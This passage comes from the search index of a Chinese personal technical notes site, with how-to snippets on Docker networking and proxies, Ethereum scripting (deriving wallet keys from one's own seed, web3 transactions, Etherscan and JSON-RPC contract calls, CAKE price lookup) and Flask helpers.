<p>\u8fd9\u4e2a\u65b9\u6848\u6709\u70b9\u590d\u6742\uff0c\u4f46\u597d\u5904\u5728\u4e8e\u91cd\u542f\u5bb9\u5668\u4e0d\u9700\u8981\u989d\u5916\u914d\u7f6e\uff0c\u53cd\u6b63\u8fde\u4e0d\u4e0a\u7f51</p> <p>\u574f\u5904\u5728\u4e8e\u8bbf\u95ee\u7f51\u7edc\u7684\u8bf7\u6c42\u4f1a\u4e00\u76f4\u5361\u4f4f\uff0c\u5e94\u7528\u5c42\u9700\u8981\u81ea\u5df1\u8003\u8651\u8d85\u65f6</p> <p>\u4f60\u53ef\u4ee5\u628a\u8fd9\u4e24\u79cd\u65b9\u6848\u7ed3\u5408\u8d77\u6765\uff0c\u5373\u4f7f\u5fd8\u4e86\u5220\u9ed8\u8ba4\u8def\u7531\u4e5f\u80fd\u4fdd\u8bc1\u4e0d\u80fd\u8054\u7f51</p>"},{"location":"Docker/#registryapi","title":"\u79c1\u6709registry\u7684api","text":"<p>\u6587\u6863\uff1a https://docs.docker.com/registry/spec/api/</p> <p>\u5217\u51fa\u6240\u6709\u955c\u50cf\uff1a <code>/v2/_catalog</code></p> <p>\u5217\u51fa\u6307\u5b9a\u955c\u50cf\u7684\u6240\u6709\u6807\u7b7e\uff1a <code>/v2/&lt;name&gt;/tags/list</code></p>"},{"location":"Docker/#docker-pull_1","title":"\u914d\u7f6edocker pull\u4f7f\u7528\u4ee3\u7406","text":"<p>\u5b98\u65b9\u6587\u6863\uff1a https://docs.docker.com/config/daemon/systemd/#httphttps-proxy</p> <pre><code>mkdir -p /etc/systemd/system/docker.service.d\nvi /etc/systemd/system/docker.service.d/http-proxy.conf\nsystemctl daemon-reload\nsystemctl restart docker\nsystemctl show --property=Environment docker\n</code></pre> <pre><code>[Service]\nEnvironment=\"HTTP_PROXY=http://proxy.example.com:80\"\nEnvironment=\"HTTPS_PROXY=https://proxy.example.com:443\"\nEnvironment=\"NO_PROXY=localhost,127.0.0.1,docker-registry.example.com,.corp\"\n</code></pre>"},{"location":"Docker/#docker-daemon_1","title":"\u914d\u7f6edocker daemon\u9000\u51fa\u65f6\u4e0d\u81ea\u52a8\u5173\u95ed\u5bb9\u5668","text":"<p>\u53c2\u8003\uff1a https://docs.docker.com/config/containers/live-restore/</p> <pre><code># vi /etc/docker/daemon.json\n{\n\"live-restore\": true\n}\n# systemctl reload docker\n</code></pre>"},{"location":"ETH/","title":"ETH","text":""},{"location":"ETH/#eth","title":"ETH","text":"<p>\u5b66\u4e60\u4e00\u4e0b\u4ee5\u592a\u574a\uff0c\u76ee\u524d\u53ef\u4ee5\u5728\u533a\u5757\u94fe\u4e0a\u523b\u5b57\u4e86\uff0c\u6bcf\u4e2a\u4ea4\u6613\u53ef\u4ee5\u5b58\u50a830K\u7684\u5185\u5bb9</p>"},{"location":"ETH/#ropsteneth","title":"\u83b7\u53d6\u6d4b\u8bd5\u7f51\u7edcropsten\u7684ETH","text":"<p>\u76ee\u524d\u7684faucet\u5217\u8868\uff0c\u4e0d\u8fc7\u6709\u53ef\u80fd\u4ed6\u4eec\u5de5\u4f5c\u5728fork\u4e0a\uff0c\u83b7\u5f97\u7684eth\u4e0d\u80fd\u5728etherscan\u4e0a\u770b\u5230</p> <p>\u8fd1\u671f\u4ee5\u592a\u574aRopsten\u6d4b\u8bd5\u7f51\u7684Istanbul\u5347\u7ea7\u7531\u4e8e\u5927\u90e8\u5206\u7b97\u529b\u6ca1\u6709\u5347\u7ea7\u8282\u70b9\u8f6f\u4ef6\uff0c\u5b9e\u9645\u4e0a\u5df2\u7ecf\u53d1\u751f\u4e86\u5206\u53c9</p> <ul> <li>https://faucet.ropsten.be</li> <li>https://faucet.metamask.io</li> <li>http://faucet.bitfwd.xyz</li> </ul>"},{"location":"ETH/#metamask","title":"\u751f\u6210\u4e00\u5806\u4e0eMetaMask\u517c\u5bb9\u7684\u5730\u5740","text":"<p>MetaMask\u7b49\u94b1\u5305\u7684\u5de5\u4f5c\u539f\u7406\u662f\u4ece\u4e00\u4e32seed phrase\u751f\u6210\u4e00\u7cfb\u5217\u79c1\u94a5</p> <p>\u4f7f\u7528lightwallet\u8fd9\u4e2anpm\u5305\u6765\u751f\u6210MetaMask\u517c\u5bb9\u76841000\u4e2a\u5730\u5740</p> <pre><code># \u9700\u8981\u4f7f\u7528\u7248\u672c2\uff0c\u66f4\u65b0\u7684\u7248\u672c\u4fee\u6539\u4e86API\u9700\u8981\u63d0\u4f9bsalt\n$ npm install eth-lightwallet@2.5.6\n\n# \u4fee\u6539node_modules\\_bitcore-lib@8.14.4@bitcore-lib\\index.js\u6dfb\u52a0\u4e00\u4e2areturn\n# bitcore.versionGuard = function(version) {return;\n\nvar lightwallet = require(\"eth-lightwallet\");\nvar secretSeed = \u4ecemetamask\u590d\u5236\nvar password = \u968f\u610f\u8bbe\u7f6e\u4e00\u4e2a\u5bc6\u7801\uff0c\u5728\u5185\u5b58\u4e2d\u5b58\u50a8\u7684\u662f\u4f7f\u7528\u8fd9\u4e2a\u5bc6\u7801\u52a0\u5bc6\u540e\u7684\u79c1\u94a5\nvar hdPathString = \"m/44'/60'/0'/0\";\nvar ks; lightwallet.keystore.deriveKeyFromPassword(password, function (err, pwDerivedKey) {\nks = new lightwallet.keystore(secretSeed, pwDerivedKey, hdPathString);\n//console.log(ks);\nks.generateNewAddress(pwDerivedKey, 1000, hdPathString);\nfor(var i of ks.getAddresses(hdPathString)){\nconsole.log(i, ks.exportPrivateKey(i, pwDerivedKey, hdPathString));\n}\n})\n</code></pre>"},{"location":"ETH/#pythonweb3py","title":"Python\u53d1\u8d77\u4ea4\u6613(Web3.py)","text":"<p>pip3 install web3\uff0c\u9700\u8981python3.7 \uff08\u5728Ubuntu16.04\u4e0a\u5b89\u88c5Python 3.7\uff09</p> <p>\u5728infura.io\u6ce8\u518c\uff0c\u5f97\u5230\u4e00\u4e2aproject id\uff0c\u8bbe\u7f6e\u4e3a\u73af\u5883\u53d8\u91cfWEB3_INFURA_PROJECT_ID</p> <pre><code>import os\nos.environ[\"WEB3_INFURA_PROJECT_ID\"]=\"\u4eceinfura.io\u590d\u5236\"\nfrom web3.auto.infura.ropsten import w3\nfrom base64 import b16encode\ndef senddata(privatekey, data, to=None, nonce=None):\n    addr = w3.eth.account.privateKeyToAccount(privatekey).address\n    if not to:\n        to = addr\n    if not to.startswith(\"0x\"):\n        to = \"0x\"+to\n    if len(data)&gt;30*1024:\n        raise Exception(\"data too big\")\n    if nonce is None:\n        nonce=w3.eth.getTransactionCount(addr)\n    tx=dict(nonce=nonce, gasPrice=2000000000, gas=5940000, to=to, value=0, data=data)\n    stx=w3.eth.account.sign_transaction(tx, privatekey)\n    return b16encode(w3.eth.sendRawTransaction(stx.rawTransaction)).decode().lower()\n</code></pre>"},{"location":"ETH/#api","title":"\u5730\u5740\u4ea4\u6613\u67e5\u8be2API","text":"<p>\u6ce8\u610fetherscan.io\u4f7f\u7528\u4e86cloudflare\uff0c\u5fc5\u987b\u8bbe\u7f6e\u4e00\u4e2aUser-Agent\u624d\u80fd\u8c03\u7528</p> <p>\u76ee\u524d\u8fd8\u4e0d\u9700\u8981apikey\u5c31\u80fd\u76f4\u63a5\u8c03\u7528</p> <pre><code>import requests\ndef gettx(addr):\n    return requests.get(\"https://api-ropsten.etherscan.io/api?module=account&amp;action=txlist&amp;address=\"+addr+\"&amp;startblock=0&amp;endblock=99999999&amp;sort=asc&amp;apikey=YourApiKeyToken\", headers={\"User-Agent\":\"ethquery\"}).json()[\"result\"]\n</code></pre> <p>\u8fd4\u56de\u7684\u6570\u7ec4\u53ef\u80fd\u6bcf\u4e2a\u4ea4\u6613\u90fd\u91cd\u590d\u4e86\u4e24\u6b21\uff0c\u9700\u8981\u53bb\u91cd\uff1a</p> <pre><code>seenhash = []\nfor tx in gettx(addr):\n    if len(tx[\"input\"])&gt;2 and tx[\"hash\"] not in seenhash:\n        # \u5904\u7406tx[\"input\"]\n        seenhash.append(tx[\"hash\"])\n</code></pre>"},{"location":"ETH/#block-id","title":"\u65f6\u95f4\u6233\u8f6cblock id","text":"<p>\u6709\u4e9b\u65f6\u5019\u6211\u4eec\u9700\u8981\u77e5\u9053\u7279\u5b9a\u65f6\u95f4\u70b9\u7684\u533a\u5757\u9ad8\u5ea6\uff0c\u6765\u67e5\u8be2\u5f53\u65f6\u7684\u5408\u7ea6\u6570\u636e</p> <p>\u4e0d\u4f9d\u8d56etherscan\u7684\u65b9\u6cd5\u53ef\u4ee5\u6309\u7167\u5f53\u524d\u533a\u5757\u9ad8\u5ea6\u3001\u5df2\u7ecf\u6d41\u901d\u7684\u65f6\u95f4\u548c\u51fa\u5757\u901f\u5ea6\u8fdb\u884c\u8ba1\u7b97\uff0c\u7b97\u51fa\u6765\u7684blockid\u518d\u8c03\u7528web3 API\u67e5\u8be2timestamp\u518d\u6b21\u8ba1\u7b97\uff0c\u76f4\u5230\u8bef\u5dee\u5c0f\u4e8e\u9608\u503c\u5373\u53ef</p> <p>etherscan\u63d0\u4f9b\u4e86\u8fd9\u4e2aAPI: https://etherscan.io/apis#blocks</p> <pre><code>cache={}\napikey=\"\"\ndef timestamp2blockid(ts, retry=3):\ncachekey = \"timestamp2blockid_\"+str(ts)\nif cachekey in cache:\n#print(\"cache used\")\nreturn cache[cachekey]\nx = sess.get(\"https://api.etherscan.io/api?module=block&amp;action=getblocknobytime&amp;timestamp=\"+str(ts)+\"&amp;closest=before&amp;apikey=\"+apikey)\n#print(x.json())\nif 'result' not in x.json():\nif retry:\nprint(\"[retry] timestamp2blockid\", ts)\nreturn timestamp2blockid(ts, retry=retry-1)\nelse:\nprint(x.json())\nres = x.json()[\"result\"]\ncache[cachekey] = res\nreturn res\n</code></pre>"},{"location":"ETH/#_1","title":"\u6839\u636e\u51fd\u6570\u540d\u8c03\u7528\u5408\u7ea6","text":"<p>\u6807\u8bb0\u4e86view\u7684\u51fd\u6570\u53ef\u4ee5\u76f4\u63a5\u5728etherscan\u8bfb\u53d6\u5408\u7ea6\u8c03\u7528\uff0c\u4f46\u6709\u4e9b\u51fd\u6570\u4e0d\u4f1a\u6d89\u53ca\u5199\u64cd\u4f5c\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u81ea\u5df1\u8c03\u7528\u800c\u4e0d\u7528\u53d1\u8d77\u94fe\u4e0a\u4ea4\u6613\uff08\u5373\u4f7f\u4ea4\u6613\u4e5f\u62ff\u4e0d\u5230\u8fd4\u56de\u503c\uff09</p> <p>\u9996\u5148\u6211\u4eec\u9700\u8981\u4e86\u89e3eth_call\u7684data \u524d4\u4e2a\u5b57\u8282\u5c31\u662f\u51fd\u6570\u7b7e\u540d\u7684\u54c8\u5e0c\uff0c\u54c8\u5e0c\u7b97\u6cd5\u662fkeccak_sha3\u53d6\u524d4\u4e2a\u5b57\u8282</p> <p>\u8fd9\u4e1c\u897f\u53eb\u505aABI\uff0c \u6587\u6863\uff1a https://solidity.readthedocs.io/en/v0.5.3/abi-spec.html</p> <p>\u4f8b\u5982balanceOf\u51fd\u6570\u53ea\u63a5\u53d7\u4e00\u4e2a\u5730\u5740\u4f5c\u4e3a\u53c2\u6570\uff0c\u5b83\u7684\u7b7e\u540d\u5c31\u662f<code>balanceOf(address)</code>\uff0c\u54c8\u5e0c\u662f<code>70a08231</code>\uff0c\u4f60\u53ef\u4ee5\u89c2\u5bdfmetamask\u540e\u53f0\u53d1\u9001\u7684\u6d41\u91cf\u5c31\u53ef\u4ee5\u786e\u8ba4\u8fd9\u4e00\u70b9</p> <p>\u4f7f\u7528Python\u4e0d\u4f9d\u8d56web3\u8ba1\u7b97\u8fd9\u4e2a\u54c8\u5e0c\uff1a \u4f60\u53ef\u80fd\u9700\u8981<code>python3 -m pip install pycryptodome</code></p> <pre><code>from Crypto.Hash import keccak\ndef function_hash(func_str):\n    return keccak.new(digest_bits=256).update(func_str.encode(\"utf-8\")).hexdigest()[:8]\n</code></pre> <p>\u6709\u4e86\u51fd\u6570\u54c8\u5e0c\u540e \u518d\u62fc\u63a5\u51fd\u6570\u8c03\u7528\u53c2\u6570\u5c31\u80fd\u53d1\u8d77eth_call\u4e86\uff0c\u6bd4\u5982\u6211\u4eec\u9700\u8981\u628a\u5730\u5740\u5728\u5de6\u8fb9\u88650\u8865\u9f50\u523064\u5b57\u8282\uff08\u4e5f\u5c31\u662f256bit\uff09</p> <pre><code>import requests\nsess = requests.session()\nsess.headers.update({\"Content-Type\":\"application/json\"})\nWEB3_ENDPOINT = \"\" #change to your infura.io project url\n\ndef addrtoarg(addr):\n    return addr.lower().rjust(64, \"0\")\n\ncache={}\ndef callfunction(addr, func_str, args_str, blockid, returnint=True, usecache=False):\n    cachekey = \"_\".join((\"callfunction\", addr, func_str, args_str, str(blockid)))\n    try:\n        height = hex(int(blockid))\n    except:\n        height = blockid\n    if usecache and cachekey in cache and blockid!=\"latest\":\n        res = cache[cachekey]\n    else:\n        data = {\n            \"id\":1, \"jsonrpc\":\"2.0\",\n            \"method\":\"eth_call\",\n            \"params\":[{\"data\": \"0x\"+function_hash(func_str)+args_str, \"to\": addr,}, height]\n        }\n        x = sess.post(WEB3_ENDPOINT, json=data)\n        print(x.json())\n        res = x.json()[\"result\"]\n        if usecache:\n            cache[cachekey] = res\n    if not returnint:\n        return res\n    else:\n        return int(res, 16)\n</code></pre> <p>\u5176\u4e2dWEB3_ENDPOINT\u53ef\u4ee5\u662finfura\u81ea\u5df1\u6ce8\u518c\u4e00\u4e2aAPIKEY\u540e\u5f97\u5230\u7684\u5730\u5740</p> <p>\u8981\u83b7\u53d6\u6700\u65b0\u7684\u6570\u636e\u8fd8\u9700\u8981\u77e5\u9053\u5f53\u524d\u7684\u533a\u5757\u9ad8\u5ea6\uff1a</p> <pre><code>def eth_blockNumber():\n    return int(sess.post(WEB3_ENDPOINT, data='{\"id\":1,\"jsonrpc\":\"2.0\",\"method\":\"eth_blockNumber\",\"params\":[]}').json()[\"result\"], 16)\n</code></pre> <p>\u8c03\u7528\u5f88\u7b80\u5355\uff1a<code>mybalance = callfunction(contract_address, \"balanceOfUnderlying(address)\", addrtoarg(my_address), eth_blockNumber())</code></p>"},{"location":"ETH/#_2","title":"\u66f4\u590d\u6742\u7684\u53c2\u6570\u7c7b\u578b","text":"<p>\u5bf9\u4e8estring\u8fd9\u79cd\u53ef\u53d8\u957f\u5ea6\u7c7b\u578b\uff0c\u8fd8\u662f\u4f7f\u7528python\u5305<code>eth-abi</code>\u5427\uff0c\u4f8b\u5982\uff1a</p> <p>NFT-Hero\u91cc\u968f\u673a\u6570\u7528\u7684blockhashMgr\u5230\u5e95\u662f\u4ec0\u4e48\u5408\u7ea6\u5462\uff1a</p> <p>https://github.com/nfthero/SuperHero/blob/c87346f36efb09667ad8f0eeaf8df04a710bbecd/Package.sol#L87</p> <p>\u5c31\u60f3\u8981\u67e5\u8be2\u4e00\u4e0bmembers\u8fd9\u4e2a\u5b57\u5178\uff0c\u5176\u7c7b\u578b\u662f<code>mapping(string =&gt; address) public members</code>\uff0c\u4e5f\u5c31\u610f\u5473\u7740\u53ef\u4ee5\u8c03\u7528<code>members(string)</code>\u8fd9\u4e2a\u51fd\u6570\u8fdb\u884c\u67e5\u8be2\uff1a</p> <pre><code>&gt;&gt;&gt; callfunction(\"https://http-mainnet-node.huobichain.com/\", \"0x42C1aC2AeAEc52E1cc9dC8057b089FA91fa84FC7\", \"members(string)\", base64.b16encode(eth_abi.encode_abi([\"string\"], [\"blockhashMgr\"])).decode().lower(), \"latest\", False)\n'0x0000000000000000000000003e259bfe720093abb26a2c3fe57670259b2ebea2'\n</code></pre>"},{"location":"ETH/#cake","title":"\u5b9e\u4f8b\uff1a\u83b7\u53d6Cake\u6301\u4ed3\u4ef7\u503c","text":"<p>Warning</p> <p>\u672c\u6587\u4e0d\u4f5c\u4e3a\u6295\u8d44\u5efa\u8bae\uff0c\u672c\u9879\u76ee\u5408\u7ea6\u4ee3\u78012020/11/05\u4e5f\u51fa\u8fc7\u6f0f\u6d1e\u5bfc\u81f4\u6316\u77ff\u5956\u52b1\u4ee3\u5e01\u8d85\u53d1</p> <p>\u5e01\u5b89\u667a\u80fd\u94fe\u4e0a\u6709\u4e2a\u6284\u4e86Uniswap\u7684pancakeswap, \u7f51\u9875\u4e0a\u5f53\u524d(2021/01/06)\u663e\u793a\u8d28\u62bcCAKE\u7684\u5e74\u5316228%\uff0c\u90a3\u5f53\u7136\u662f\u5c1d\u8bd5\u4e00\u4e0b\u54af\uff0c\u4e8e\u662f\u81ea\u7136\u6709\u4e86\u9700\u6c42\uff1a\u8ba1\u7b97\u81ea\u5df1\u6301\u4ed3CAKE\u7684\u5b9e\u65f6\u4ef7\u503c\uff0c\u6301\u4ed3\u5305\u542b\u8d28\u62bc\u5956\u52b1\u7684\u90e8\u5206</p> <p>\u90a3\u4e48\u5b9e\u73b0\u8fd9\u4e2a\u9700\u6c42\u5c31\u9700\u8981\u89e3\u51b3\u4e24\u4e2a\u95ee\u9898\uff1a\u5982\u4f55\u83b7\u53d6\u81ea\u5df1\u7684CAKE\u5956\u52b1\u6570\u91cf\uff0c\u5982\u4f55\u83b7\u53d6CAKE\u7684\u4ef7\u683c\u4fe1\u606f</p> <p>\u7b2c\u4e00\u4e2a\u95ee\u9898\u597d\u89e3\u51b3\uff0c\u6309\u7167\u4e0a\u9762\u8c03\u7528\u5408\u7ea6\u5373\u53ef\uff0c\u5408\u7ea6\u8c03\u7528\u9700\u8981\u4e24\u4e2a\u53c2\u6570\uff0c\u5373\u4f7f\u4e0d\u77e5\u9053\u51fd\u6570\u9009\u62e9\u5668\u548c\u51fd\u6570\u53c2\u6570\u600e\u4e48\u5199\uff0c\u4e5f\u53ef\u4ee5\u8ba9etherscan\u6765\u5e2e\u6211\u4eec\u8c03\u7528\u5408\u7ea6 \u770b\u6d41\u91cf\u5373\u53ef</p> <pre><code>WEB3_ENDPOINT='https://bsc-dataseed.binance.org/'\ncallfunction(contract_address, \"pendingCake(uint256,address)\", \"0\"*64+addrtoarg(my_address), \"latest\", usecache=False)/10**18\n</code></pre> <p>\u7b2c\u4e8c\u4e2a\u95ee\u9898\uff1a\u83b7\u53d6CAKE\u7684\u4ef7\u503c \u53ef\u4ee5\u5728pancakeswap.info\u7684token\u9875\u9762\u770b\u5230 \u5f53\u524dCAKE\u7684\u4ef7\u503c\u663e\u793a\u4e3a$0.64</p> <p>\u901a\u8fc7\u4ed4\u7ec6\u7ffb\u6d41\u91cf+F12\u770b\u524d\u7aefjs+\u5b66GraphQL\u7684\u5199\u6cd5\uff0c\u53d1\u73b0\u8fd9\u4e2a\u56fe\u67e5\u8be2\u53ef\u4ee5\u4e00\u6b21\u8fd4\u56de\u4e24\u4e2a\u5185\u5bb9\uff1a</p> <p>https://api.bscgraph.org/subgraphs/name/wowswap/graphql</p> <pre><code>{\n  tokens(where: {id: \"0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82\"}) {\n    id\n    name\n    symbol\n    derivedETH\n    tradeVolume\n    tradeVolumeUSD\n    untrackedVolumeUSD\n    totalLiquidity\n    txCount\n    __typename\n  }\n  bundles(where: {id: 1}) {\n    id\n    ethPrice\n    __typename\n  }\n}\n</code></pre> <p>\u67e5\u8be2\u5230\uff1a</p> <pre><code>{\n  \"data\": {\n    \"bundles\": [\n      {\n        \"__typename\": \"Bundle\",\n        \"ethPrice\": \"40.4164616943543110107673755202366\",\n        \"id\": \"1\"\n      }\n    ],\n    \"tokens\": [\n      {\n        \"__typename\": \"Token\",\n        \"derivedETH\": \"0.01577253120396104706816941010842497\",\n        \"id\": \"0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82\",\n        \"name\": \"PancakeSwap Token\",\n        \"symbol\": \"Cake\",\n        \"totalLiquidity\": \"17457173.064252540875767782\",\n        \"tradeVolume\": \"529331425.317628506590140745\",\n        \"tradeVolumeUSD\": \"270335080.4687124727090581348114777\",\n        \"txCount\": \"659265\",\n        \"untrackedVolumeUSD\": \"331587403.3835248774831009549837749\"\n      }\n    ]\n  }\n}\n</code></pre> <p>\u5c06\u5176\u4e2d\u7684<code>ethPrice</code>(\u5b9e\u9645\u4e0a\u662fBNB\u7684\u4ef7\u683c)\u548c<code>derivedETH</code>\u4e58\u8d77\u6765\u5c31\u662f\u6211\u4eec\u9700\u8981\u7684\u4ef7\u683c\u4e86\uff0c\u7b97\u51fa\u6765\u662f<code>$0.6375</code></p> <p>\u901a\u7528\u4e00\u70b9\u8fd8\u9700\u8981\u8c03\u7528\u5408\u7ea6<code>userInfo(uint256,address)</code>\u67e5\u8be2\u81ea\u5df1\u7684\u6301\u4ed3\uff0c\u6700\u540e\u5408\u5728\u4e00\u8d77\uff1a</p> <pre><code>(\u81ea\u5df1\u7684\u6301\u4ed3+pendingpendingCake)*derivedETH*ethPrice\n</code></pre>"},{"location":"ETH/#erigon","title":"erigon \u5bfc\u51fa\u6240\u6709\u5408\u7ea6\u5730\u5740","text":"<p>\u8fd9\u6837\u6765\u5bfc\u51facodehash\u8868\uff1a</p> <pre><code>/tank/erigon/build/bin/mdbx_dump -s PlainCodeHash /tank/eth/chaindata/ | gzip &gt; plaincodehash.txt.gz\n</code></pre> <p>\u7136\u540e\u8fd9\u6837\u5904\u7406\u5f97\u5230\u6839\u636ecodehash\u53bb\u91cd\u540e\u7684\u5730\u5740\u5217\u8868\uff1a</p> <pre><code>import gzip\noldaddr=None\ncodehash=None\nseen=set()\nfor line in gzip.open(\"plaincodehash.txt.gz\", \"rt\"):\n    if len(line)==58:\n        addr = line[1:41]\n        if addr!=oldaddr:\n            if oldaddr and codehash not in seen:\n                seen.add(codehash)\n                print(oldaddr)\n            oldaddr=addr\n    elif len(line)==66:\n        codehash = line[1:65]\nif codehash not in seen:\n    print(oldaddr)\n</code></pre>"},{"location":"Favorites/","title":"Favorites \u6536\u85cf","text":"<p>\u6536\u85cf\u4e00\u4e9b\u6709\u7528\u7684\u8d44\u6599\u54af~</p> <p>Intel i386 \u624b\u518c</p> <p>i386 \u624b\u518c\u52d8\u8bef</p> <p>\u5b57\u7b26\u7b7e\u540d\u751f\u6210</p> <p>\u4f8b\u5982lean\u5b57\u4f53\uff1a</p> <pre><code>      _/_/      _/_/      _/_/ \n   _/    _/  _/    _/  _/    _/\n  _/_/_/_/  _/_/_/_/  _/_/_/_/ \n _/    _/  _/    _/  _/    _/  \n_/    _/  _/    _/  _/    _/   \n</code></pre> <p>\u89e3\u91caShell\u547d\u4ee4\u6bcf\u4e2a\u53c2\u6570</p> <p>\u5b89\u5168\u4f1a\u8bae\u7684\u6392\u540d</p> <p>\u5efa\u8bae\u8bfb\u7684\u8bba\u6587</p> <p>Git Emoji</p> <p>Math \u8bc6\u522b\u624b\u5199\u516c\u5f0f \u753b\u51fd\u6570\u56fe\u50cf</p> <p>\u5b89\u5168\u6587\u6458 \u6bcf\u5929\u770b\u770b</p> <p>\u7f51\u7ad9\u914d\u8272</p>"},{"location":"Flask/","title":"Flask \u5907\u5fd8","text":"<p>\u5e38\u7528\u7684\u4e00\u4e9b\u64cd\u4f5c\uff0c\u81ea\u5df1\u603b\u7ed3\u7684\uff0c\u4fbf\u4e8e\u67e5\u9605</p>"},{"location":"Flask/#app_root","title":"\u5e94\u7528\u6839\u76ee\u5f55APP_ROOT","text":"<pre><code>APP_ROOT = os.path.dirname(os.path.abspath(__file__))\n</code></pre>"},{"location":"Flask/#approuteintpost","title":"app.route\u91cc\u7684int\u548cPOST","text":"<pre><code>@app.route(\"/list/&lt;int:boardid&gt;\")\n\n@app.route(\"/receive_post\", methods=[\"POST\"])\n\npost_param = int(request.form.get(\"post_param\",\"0\"))\n# get\u53c2\u6570\u7528request.args\n</code></pre>"},{"location":"Flask/#render_template","title":"render_template\u5f15\u5165\u6240\u6709\u5168\u5c40\u53d8\u91cf+\u5c40\u90e8\u53d8\u91cf","text":"<pre><code>str = str\nlen = len\nint = int\n\n@app.route(\"/\")\ndef index():\n# ... some logic code\ntargs = globals()\ntargs.update(locals())\nreturn render_template(\"template.html\", **targs)\n</code></pre>"},{"location":"Flask/#_1","title":"\u6dfb\u52a0\u591a\u4e2a\u9759\u6001\u76ee\u5f55","text":"<pre><code>from flask import Flask, render_template, Blueprint, request, redirect\napp = Flask(__name__)\n\nfor path in ['images', 'pic', 'css']:\n    blueprint = Blueprint(path, __name__, static_url_path='/'+path, static_folder=path)\n    app.register_blueprint(blueprint)\n</code></pre>"},{"location":"Flask/#gisphone","title":"\u5224\u65ad\u662f\u5426\u624b\u673a\u8bbf\u95ee g.isphone","text":"<pre><code>@app.before_request\ndef before_request():\nua = request.user_agent.string.lower()\nfor mobileua in \"android|fennec|iemobile|iphone|opera mini|opera mobi|mobile\".split(\"|\"):\nif mobileua in ua:\ng.isphone = True\nbreak\nelse:\ng.isphone = False\n</code></pre>"},{"location":"Flask/#get","title":"\u9650\u5236\u7279\u5b9aget\u6574\u6570\u53c2\u6570\u7684\u53d6\u503c","text":"<pre><code>def limit_param(param_name, default_value, minvalue, maxvalue):\n    \"\"\"\nexample: p = limit_param(\"p\", 1, 1, 5)\n\"\"\"\n    if maxvalue&lt;minvalue:\n        maxvalue = minvalue\n    try:\n        data = int(request.args.get(param_name, default_value))\n    except:\n        data = default_value\n    if data&lt;minvalue:\n        data = minvalue\n    elif data &gt; maxvalue:\n        data = maxvalue\n    return data\n</code></pre>"},{"location":"Flask/#decorator","title":"\u8981\u6c42\u767b\u5f55\u7684decorator","text":"<p>\u7528\u6cd5: <code>@require_login()</code> \u6ce8\u610f\u4f7f\u7528\u65f6\u6dfb\u52a0\u5230<code>@app.route</code>\u884c\u7684\u540e\u9762</p> <pre><code>import functools\nfrom flask import session, abort, redirect\ndef require_login(code=200, text=\"login first\", jumptologin=False):\n    def real_decorator(func):\n        @functools.wraps(func)\n        def wrapper(*args,**kwargs):\n            if \"username\" not in session:\n                if jumptologin:\n                    return redirect(\"/signin?error=needlogin&amp;next=\"+signit(request.path))\n                elif code==200:\n                    return text\n                else:\n                    abort(code)\n            else:\n                return func(*args, **kwargs)\n        return wrapper\n    return real_decorator\n</code></pre>"},{"location":"Flask/#import","title":"import\u5f15\u5165\u5217\u8868","text":"<pre><code>from flask import Flask, render_template, Blueprint, request, redirect, Markup, g, session, abort, Response, make_response, send_file, jsonify\nfrom werkzeug.utils import secure_filename\nimport time\nimport datetime\nimport random\nimport pickle\nimport requests\nimport os\nimport sys\nimport traceback\nimport mimetypes\nimport string\nimport re\nimport hashlib\nimport json\n</code></pre>"},{"location":"Flask/#requesturl","title":"request\u600e\u4e48\u62ff\u5230url\u7684\u5404\u4e2a\u90e8\u5206","text":"<p>\u6765\u81eahttps://stackoverflow.com/questions/15974730/how-do-i-get-the-different-parts-of-a-flask-requests-url</p> <p>request:</p> <p><code>curl -XGET http://127.0.0.1:5000/alert/dingding/test?x=y</code></p> <p>then:</p> <pre><code>request.method:              GET\nrequest.url:                 http://127.0.0.1:5000/alert/dingding/test?x=y\nrequest.base_url:            http://127.0.0.1:5000/alert/dingding/test\nrequest.url_charset:         utf-8\nrequest.url_root:            http://127.0.0.1:5000/\nstr(request.url_rule):       /alert/dingding/test\nrequest.host_url:            http://127.0.0.1:5000/\nrequest.host:                127.0.0.1:5000\nrequest.script_root:\nrequest.path:                /alert/dingding/test\nrequest.full_path:           /alert/dingding/test?x=y\n\nrequest.args:                ImmutableMultiDict([('x', 'y')])\nrequest.args.get('x'):       y\n</code></pre>"},{"location":"Flask/#request","title":"request\u5176\u4ed6\u7684\u90e8\u5206","text":"<pre><code>request.get_data()    POST\u5185\u5bb9 bytes\u7c7b\u578b\nrequest.endpoint      \u5904\u7406\u8fd9\u4e2a\u8bf7\u6c42\u7684\u51fd\u6570\u540d\u79f0\n</code></pre>"},{"location":"Flask/#profiling","title":"\u9047\u5230\u6027\u80fd\u74f6\u9888\u505aprofiling\u770b\u51fd\u6570\u8017\u65f6","text":"<p>\u627e\u5230\u5bf9uwsgi\u5e94\u7528\u505aprofiling\u7684dozer\u5e93</p> <p>\u4f7f\u7528\u65b9\u6cd5\uff1a</p> <ol> <li>\u5148\u5b89\u88c5python3\u5bf9\u5e94\u7684uwsgi\uff1a<code>apt install uwsgi-plugin-python3</code></li> <li>\u5199\u4e00\u4e2apython\u811a\u672c\u5305\u88c5app\uff0c\u5982<code>profiler_app.py</code>\uff1a</li> </ol> <pre><code>#!/usr/bin/python3\nfrom app import app\nfrom dozer import Profiler\nappx = Profiler(app, profile_path=\"/tmp/profiles\")\n\nif __name__ == \"__main__\":\n    import os\n    os.system(\"uwsgi -w profiler_app:appx --http :80\")\n</code></pre> <ol> <li>\u522b\u5fd8\u8bb0<code>mkdir /tmp/profiles</code> \u7136\u540e\u5c31\u53ef\u4ee5\u542f\u52a8\u4e86<code>python3 profiler_app.py</code></li> <li>\u4f7f\u7528http://127.0.0.1/_profiler/ \u67e5\u770b\u7ed3\u679c\uff0c\u53ef\u4ee5\u70b9\u5f00\u6bcf\u4e2a\u8bf7\u6c42\u770b\u5404\u4e2a\u51fd\u6570\u8017\u65f6\u8be6\u60c5</li> </ol>"},{"location":"Flask/#lazyload","title":"lazyload 